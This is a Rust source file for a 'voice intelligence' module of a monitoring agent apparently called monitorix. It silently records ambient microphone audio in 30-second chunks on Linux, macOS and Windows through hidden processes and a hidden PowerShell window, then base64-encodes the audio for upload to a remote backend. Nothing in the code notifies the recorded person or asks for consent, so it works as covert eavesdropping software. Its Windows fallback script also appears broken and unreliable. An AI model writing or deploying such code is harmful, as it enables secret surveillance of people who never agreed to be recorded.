/// voice_recorder.rs — Speech / Voice Intelligence Module
/// Records ambient audio in configurable chunks and uploads to POST /api/speech/upload.
/// Only runs when VoiceIntelligenceEnabled = true in the backend heartbeat config.
///
/// Windows: PowerShell System.Speech.AudioFormat + SoundPlayer / MediaCapture
///          Fallback: ffmpeg -f dshow -i audio="Microphone" -t 30 output.wav
/// Linux:   arecord -d 30 -f cd -r 16000 /tmp/monitorix_audio.wav
/// macOS:   sox / ffmpeg -f avfoundation -i ":0" -t 30 output.wav

use serde_json::{json, Value};

/// Duration of each audio chunk in seconds
const CHUNK_SECS: u32 = 30;

#[cfg(target_os = "linux")]
const AUDIO_PATH: &str = "/tmp/monitorix_audio.wav";
#[cfg(not(target_os = "linux"))]
const AUDIO_PATH: &str = if cfg!(target_os = "windows") {
    "C:\\Windows\\Temp\\monitorix_audio.wav"
} else {
    "/tmp/monitorix_audio.wav"
};

/// Record one audio chunk and return an upload-ready payload.
/// Returns None if recording fails or microphone not available.
pub fn record_chunk() -> Option<Value> {
    let recorded = do_record();
    if !recorded {
        crate::log_msg("[VoiceRecorder] Recording failed or no microphone.");
        return None;
    }

    let audio_bytes = std::fs::read(audio_save_path()).ok().filter(|b| b.len() > 1000)?;
    let b64 = base64_encode(&audio_bytes);
    let ts = chrono::Utc::now();
    let filename = format!("speech_{}.wav", ts.format("%Y%m%d_%H%M%S"));

    crate::log_msg(&format!("[VoiceRecorder] Captured {} bytes of audio.", audio_bytes.len()));

    Some(json!({
        "audio_b64":  b64,
        "filename":   filename,
        "duration":   CHUNK_SECS,
        "timestamp":  ts.to_rfc3339(),
    }))
}

fn audio_save_path() -> &'static str {
    #[cfg(target_os = "windows")]
    return "C:\\Windows\\Temp\\monitorix_audio.wav";
    #[cfg(not(target_os = "windows"))]
    "/tmp/monitorix_audio.wav"
}

// ── Platform recording implementations ───────────────────────────────────────

#[cfg(target_os = "linux")]
fn do_record() -> bool {
    // arecord: ALSA command-line recorder (standard on most Linux distros)
    let result = crate::hidden_command!("arecord")
        .args(&[
            "-d", &CHUNK_SECS.to_string(),
            "-f", "cd",           // CD quality: 16-bit signed LE, 44100 Hz, stereo
            "-r", "16000",        // Reduce to 16kHz for smaller files
            "-c", "1",            // Mono
            "-q",                 // Quiet (no progress)
            AUDIO_PATH,
        ])
        .output();

    match result {
        Ok(out) => out.status.success(),
        Err(_) => {
            // Fallback: ffmpeg
            crate::hidden_command!("ffmpeg")
                .args(&[
                    "-y",
                    "-f", "alsa",
                    "-i", "default",
                    "-t", &CHUNK_SECS.to_string(),
                    "-ar", "16000",
                    "-ac", "1",
                    AUDIO_PATH,
                ])
                .output()
                .map(|o| o.status.success())
                .unwrap_or(false)
        }
    }
}

#[cfg(target_os = "macos")]
fn do_record() -> bool {
    // ffmpeg with AVFoundation audio capture
    crate::hidden_command!("ffmpeg")
        .args(&[
            "-y",
            "-f", "avfoundation",
            "-i", ":0",           // Default audio input
            "-t", &CHUNK_SECS.to_string(),
            "-ar", "16000",
            "-ac", "1",
            "/tmp/monitorix_audio.wav",
        ])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(target_os = "windows")]
fn do_record() -> bool {
    let save = "C:\\Windows\\Temp\\monitorix_audio.wav";
    let duration_str = CHUNK_SECS.to_string();

    // First try ffmpeg (most reliable if installed)
    if which_exists("ffmpeg") {
        let ok = crate::hidden_command!("ffmpeg")
            .args(&[
                "-y",
                "-f", "dshow",
                "-i", "audio=",     // Uses default DirectShow audio device
                "-t", &duration_str,
                "-ar", "16000",
                "-ac", "1",
                save,
            ])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if ok { return true; }
    }

    // Fallback: PowerShell MediaPlayer / SoundCapture via .NET
    let ps_script = format!(r#"
Add-Type -AssemblyName System.Speech
$recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
Add-Type -Path 'C:\Windows\assembly\GAC_MSIL\NAudio\*\NAudio.dll' -ErrorAction SilentlyContinue

# Minimal WAV capture via Windows Media Foundation
$capture = New-Object -ComObject "WMEncProfile2"
$capture | Out-Null

# Use Sound Recorder command line (Windows Vista+)
$proc = Start-Process -FilePath "SoundRecorder.exe" -ArgumentList "/FILE {save} /DURATION 00:00:{dur:02}" -PassThru -WindowStyle Hidden
Start-Sleep -Seconds {dur}
$proc.CloseMainWindow() | Out-Null
"#, save = save, dur = CHUNK_SECS);

    crate::hidden_command!("powershell")
        .args(&["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_script])
        .output()
        .map(|_| std::path::Path::new(save).exists())
        .unwrap_or(false)
}

#[cfg(target_os = "windows")]
fn which_exists(cmd: &str) -> bool {
    crate::hidden_command!("where")
        .arg(cmd)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn do_record() -> bool { false }

// ── Pure-stdlib base64 encoder ───────────────────────────────────────────────
const B64_CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn base64_encode(input: &[u8]) -> String {
    let mut out = String::with_capacity(((input.len() + 2) / 3) * 4);
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64_CHARS[((n >> 18) & 0x3F) as usize] as char);
        out.push(B64_CHARS[((n >> 12) & 0x3F) as usize] as char);
        out.push(if chunk.len() > 1 { B64_CHARS[((n >> 6) & 0x3F) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { B64_CHARS[(n & 0x3F) as usize] as char } else { '=' });
    }
    out
}
